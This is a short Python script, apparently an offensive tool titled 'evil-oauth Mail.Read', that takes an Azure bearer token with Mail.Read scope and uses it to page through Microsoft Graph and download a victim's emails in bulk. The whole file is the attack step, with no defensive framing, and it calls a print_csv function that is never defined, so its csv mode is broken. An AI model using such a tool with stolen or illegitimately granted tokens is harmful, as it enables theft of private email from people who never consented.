import requests
import argparse

def print_normal(emails, email_count):
	count = 0
	for email in emails:
		count += 1
		if count > email_count and email_count != -1:
			break	
		print(email)

def print_emails(emails, email_count, mode):
	
	if mode == 'normal':
		print_normal(emails, email_count)
	elif mode == 'csv':
		print_csv(emails, email_count)

parser = argparse.ArgumentParser('evil-oauth Mail.Read')
parser.add_argument('bearer_token', help='Microsoft Azure Bearer Access Token with Mail.Read Scope')
parser.add_argument('-c', '--count', default=5, type=int, help='Number of emails to download (-1 for all)')
parser.add_argument('-m', '--mode', default='normal', help='Print mode normal/csv')
args = parser.parse_args()

bearer_token = args.bearer_token
email_count = args.count
mode = args.mode

graph_url = 'https://graph.microsoft.com/v1.0/me/messages'
graph_headers = {
    'Authorization': f'Bearer {bearer_token}'
}

emails = []
# Download until count reached or no emails remaning
# Always download 10 at a time
while True:
	graph_response = requests.get(graph_url, headers=graph_headers)

	emails_resp = graph_response.json()

	emails_context = emails_resp.get('@odata.context')
	emails_value = emails_resp.get('value')
	emails_next_link = emails_resp.get('@odata.nextLink')
	
	emails = emails + emails_value
	
	if not emails_next_link or (email_count != -1 and len(emails) >= email_count):
		break

	graph_url = emails_next_link

print_emails(emails, email_count, mode)
